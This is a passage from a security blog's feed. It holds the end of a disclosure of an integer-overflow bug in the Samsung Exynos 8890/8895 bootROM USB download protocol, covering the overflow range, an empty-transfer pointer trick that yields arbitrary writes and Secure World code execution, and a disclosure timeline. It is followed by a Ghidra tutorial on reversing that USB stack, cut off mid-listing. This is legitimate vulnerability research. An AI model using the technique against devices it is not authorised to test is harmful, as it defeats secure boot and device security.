&lt;p&gt;These efforts led to the discovery of a bug in the USB stack that can be exploited to run arbitrary code.&lt;/p&gt;
&lt;p&gt;The following chipsets are known to be affected by this bug :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Exynos 8890&lt;/li&gt;
&lt;li&gt;Exynos 8895&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://github.com/frederic/exynos-usbdl"&gt;exynos-usbdl, an open source tool available on Github&lt;/a&gt;, exploits this vulnerability to load and run unsigned code.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Good times with dental scraper" src="https://fredericb.info/blog/exy-bootrom/scraper.png"&gt;&lt;/p&gt;
&lt;h1&gt;Vulnerability details&lt;/h1&gt;
&lt;p&gt;Exynos BootROM implements a very simple USB protocol to receive a bootloader binary from an USB host. That binary is encapsulated in a small structure &lt;em&gt;dldata&lt;/em&gt;, and sent through USB bulk transfers.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;dldata_s&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;unknown0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;u_int32_t&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;// header(8) + data(n) + footer(2)&lt;/span&gt;
    &lt;span class="n"&gt;u_int8_t&lt;/span&gt;  &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="c1"&gt;//example data of size &amp;#39;n&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;u_int16_t&lt;/span&gt; &lt;span class="n"&gt;unknown1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//footer&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;dldata&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Integer overflow bug&lt;/h2&gt;
&lt;p&gt;BootROM writes received data into buffer &lt;em&gt;dl_buf&lt;/em&gt; at address [0x02021800..0x02070000] (0x4E800 bytes).
But first, a check ensures that transferred data won't overflow &lt;em&gt;dl_buf&lt;/em&gt; buffer :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dl_buf&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dldata&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x02070000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;usb_download_status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x02&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;//error&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, this check on 32 bits is vulnerable to an integer overflow if &lt;em&gt;dldata.size&lt;/em&gt; is higher than 0xFDFDE7FF (&lt;em&gt;dl_buf&lt;/em&gt; + 0xFDFDE800 ≡ 0x0 mod 2³²).&lt;/p&gt;
&lt;p&gt;So the bootROM accepts a payload of regular size [0x10..0x4E800] bytes (don't go below if you want to avoid integer underflows...), but due to that bug, &lt;strong&gt;also accepts a payload of [0xFDFDE800..0xFFFFFFFF] bytes.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;Empty transfer trick&lt;/h2&gt;
&lt;p&gt;The integer overflow bug allows us to bypass the size check to send a very large payload to the bootROM.
Such contiguous memory overflow may corrupt memory after &lt;em&gt;dl_buf&lt;/em&gt; buffer, but the memory layout will cause the target to crash before any interesting (from attacker's point of view) memory corruption happens.&lt;/p&gt;
&lt;p&gt;First, because &lt;em&gt;dl_buf&lt;/em&gt; is located at the end of the in-use memory (after stack area, for example), so there's no bootROM runtime data to corrupt.
But also because accessing inexistent memory regions will cause a crash.&lt;/p&gt;
&lt;p&gt;Nevertheless, there's a trick to overcome that limitation. A large download is expected to be splitted into multiple small transfers of equal size (0xfffe00 bytes), except the last transfer which can be smaller.&lt;/p&gt;
&lt;p&gt;Each of these transfers triggers the USB transfer handler of the bootROM. This handler appends received data to the destination buffer &lt;em&gt;dl_buf&lt;/em&gt;. We would expect that &lt;em&gt;dl_buf&lt;/em&gt; pointer is then incremented by the size that has been appended. But instead, destination pointer &lt;em&gt;dl_buf&lt;/em&gt; is incremented by the expected transfer size (0xfffe00 bytes). So, by sending empty transfers (transfer without data), we can increment the destination pointer &lt;em&gt;dl_buf&lt;/em&gt; without actually writing any data, thus not risking any invalid memory access.&lt;/p&gt;
&lt;p&gt;With this technique, we can easily increase &lt;em&gt;dl_buf&lt;/em&gt; pointer to reach an address convenient for exploitation.&lt;/p&gt;
&lt;p&gt;Finally, the last transfer (non-empty this time) is used to corrupt memory pointed by manipulated address &lt;em&gt;dl_buf&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In summary, we can write 512 bytes (or less) of arbitrary data in memory range [0x0..0x020217FF], at an arbitrary offset. In this memory range, multiple data structures can be overwritten to achieve arbitrary code execution: function pointers, stack region, etc...&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The USB boot feature in the Exynos bootROM only runs signed bootloader images (when Secure Boot is enabled).
However a pre-auth integer overflow bug allows an attacker with physical access to corrupt bootROM RAM.
So the attacker can execute arbitrary code in Secure World, at very early boot stage.&lt;/p&gt;
&lt;h1&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2020-02-12 &lt;a href="https://gist.github.com/frederic/6228d60b8ddcf959eb3bea105f49348e"&gt;Bug discovery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2020-**-** Proof-of-concept development&lt;/li&gt;
&lt;li&gt;2020-05-06 Vulnerability disclosed to Samsung&lt;/li&gt;
&lt;li&gt;2020-06-10 Report dismissed as duplicate&lt;/li&gt;
&lt;/ul&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="usb"></category><category term="exploit"></category></entry><entry><title>Reverse engineer USB stack of Exynos BootROM</title><link href="https://fredericb.info/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html" rel="alternate"></link><published>2020-06-16T00:00:00-07:00</published><updated>2020-06-16T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2020-06-16:/2020/06/reverse-engineer-usb-stack-of-exynos-bootrom.html</id><summary type="html">&lt;p&gt;In the previous post, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exynos (8895 in this post) bootROM contains a minimal USB stack to load a signed bootloader from an USB host (a.k.a. boot from USB). 
This post summarizes how this USB stack can be reversed using the Great …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In the previous post, we explained how to &lt;a href="https://fredericb.info/2020/06/exynos8890-bootrom-dump-dump-exynos-8890-bootrom-from-samsung-galaxy-s7.html"&gt;dump Exynos bootROM&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exynos (8895 in this post) bootROM contains a minimal USB stack to load a signed bootloader from an USB host (a.k.a. boot from USB). 
This post summarizes how this USB stack can be reversed using the Great Tool &lt;a href="https://ghidra-sre.org/"&gt;Ghidra&lt;/a&gt; and &lt;a href="https://opensource.samsung.com/"&gt;Linux kernel source code&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The goal is to locate and analyze the proprietary USB protocol used to load the bootloader in RAM.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Catch the dragon" src="https://fredericb.info/blog/exy-bootrom/CatchTheDragon.png" width="800px"&gt;&lt;/p&gt;
&lt;h1&gt;SoC level&lt;/h1&gt;
&lt;p&gt;Device Tree Source files in Linux kernel provide a detailed description (like physical address and size) of Exynos SoC peripherals, including the USB controller. In file &lt;em&gt;arch/arm64/boot/dts/exynos/exynos8895.dtsi&lt;/em&gt;, we learn that the USB controller is mapped at &lt;strong&gt;0x10C00000&lt;/strong&gt; (also known as base address):&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB controller in DTSI" src="https://fredericb.info/blog/exy-bootrom/dwc3Dtsi.png"&gt;&lt;/p&gt;
&lt;p&gt;Ghidra &lt;em&gt;Memory Map&lt;/em&gt; feature allows us to create a memory block that represents this USB peripheral :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Memory map in Ghidra" src="https://fredericb.info/blog/exy-bootrom/bootromMemMap.png"&gt;&lt;/p&gt;
&lt;p&gt;Don't forget to click &lt;strong&gt;Analysis&amp;gt;Auto Analyze&lt;/strong&gt; to update cross references to our new memory block.&lt;/p&gt;
&lt;h1&gt;Peripheral level&lt;/h1&gt;
&lt;p&gt;The Linux kernel also contains a list of registers and their offset to interact with the USB controller :&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB registers in kernel" src="https://fredericb.info/blog/exy-bootrom/dwc3Regs.png"&gt;&lt;/p&gt;
&lt;p&gt;Register offsets are relative to the base address mentioned earlier.
Based on this list, we can rename each USB register referenced from the bootROM code (&lt;strong&gt;Navigation-&amp;gt;Next Data&lt;/strong&gt;) :&lt;/p&gt;
&lt;p&gt;&lt;img alt="Xrefs to USB registers in Ghidra" src="https://fredericb.info/blog/exy-bootrom/regsXrefs2.png"&gt;&lt;/p&gt;
&lt;p&gt;Adding names will help us to understand the purpose of functions that access these registers.&lt;/p&gt;
&lt;h1&gt;Driver level&lt;/h1&gt;
&lt;p&gt;BootROM functions that access USB registers directly are dedicated to USB operations. They are similar to the Linux USB driver code, but simplified since bootROM is bare metal code, without interrupt handlers, threads or even dynamic memory allocation.&lt;/p&gt;
&lt;p&gt;Despite the lack of public documentation, we can study the Linux USB driver code to understand the purpose of most important USB registers.&lt;/p&gt;
&lt;p&gt;With a better understanding of these registers, we can now infer the purpose of bootROM functions based on read/write operations they perform on these registers. In some cases, bootROM and Linux USB driver functions have such similar access patterns (to USB registers) that they can be quickly identified by comparison.&lt;/p&gt;
&lt;h2&gt;USB enumeration and configurration&lt;/h2&gt;
&lt;p&gt;Per USB specifications, when a new device is attached, USB host assigns it an unique address by sending the &lt;em&gt;Standard Device Request&lt;/em&gt; &lt;strong&gt;USB_REQ_SET_ADDRESS&lt;/strong&gt;. Device must then set its assigned address by writing it to register &lt;strong&gt;DWC3_DCFG&lt;/strong&gt;. And thanks to the Linux USB driver, we even know that device address is a 7-bit value at offset 3 in this register.&lt;/p&gt;
&lt;p&gt;By looking at references to &lt;strong&gt;DWC3_DCFG&lt;/strong&gt; in Ghidra, we can locate bootROM functions that access this register :&lt;/p&gt;
&lt;p&gt;&lt;img alt="USB controller in DTSI" src="https://fredericb.info/blog/exy-bootrom/dwc3DCFG.png"&gt;&lt;/p&gt;
&lt;p&gt;Among these functions, only &lt;em&gt;write_DWC3_DCFG_DEVADDR&lt;/em&gt; sets device address in &lt;strong&gt;DWC3_DCFG&lt;/strong&gt; register :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;write_DWC3_DCFG_DEVADDR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;devaddr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cRead_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_DCFG&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;cWrite_4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DWC3_DCFG&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xfffffc00&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;uVar1&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;devaddr&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0x7f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;// DWC3_DCFG[3:7] : device address&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By exploring incoming function calls to &lt;em&gt;write_DWC3_DCFG_DEVADDR&lt;/em&gt;, we can easily locate the function that handles all incoming &lt;em&gt;Standard Device Requests&lt;/em&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_handle_standard_device_request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;longlong&lt;/span&gt; &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;uint&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;//[...]&lt;/span&gt;
  &lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_REQ_SET_ADDRESS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;write_DWC3_DCFG_DEVADDR&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ulonglong&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="c1"&gt;//set device address assigned by USB host&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;undefined4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;puVar3&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bRequest&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_REQ_GET_DESCRIPTOR&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_DT_DEVICE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;usb_init_device_descriptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sUSBBuffers_ptr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x70&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x12&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;descriptorType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;USB_DT_CONFIG&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;puVar2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;USBBuffers_ptr&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;usb_init_descriptors&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;puVar2&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;event_buffer&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x70&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="c1"&gt;//[...]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Among all &lt;em&gt;Standard Device Requests&lt;/em&gt; sent during USB enumeration phase, &lt;strong&gt;USB_REQ_GET_DESCRIPTOR&lt;/strong&gt; is another interesting one.&lt;/p&gt;
&lt;p&gt;USB descriptors are sent to USB host in order to describe device, interface &amp;amp; endpoints implemented by the device. These structures are part of the USB standard, so we can simply import structure definitions (struct USB_DESCRIPTORS &amp;amp; USB_DEVICE_DESCRIPTOR) from Linux kernel in Ghidra (&lt;strong&gt;File-&amp;gt;Parse C source...&lt;/strong&gt;) :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_init_device_descriptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USB_DEVICE_DESCRIPTOR&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDescriptorType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// USB_DT_DEVICE&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdUSBL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdUSBH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceSubClass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bDeviceProtocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bMaxPacketSize0&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;DAT_02021544&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idVendorL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xe8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idVendorH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// VENDOR ID 0x04E8&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idProductL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x34&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;idProductH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x12&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//PRODUCT ID 0x1234&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdDeviceL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bcdDeviceH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iManufacturer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iProduct&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iSerialNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bNumConfigurations&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;usb_init_descriptors&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;USB_DESCRIPTORS&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;param_1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
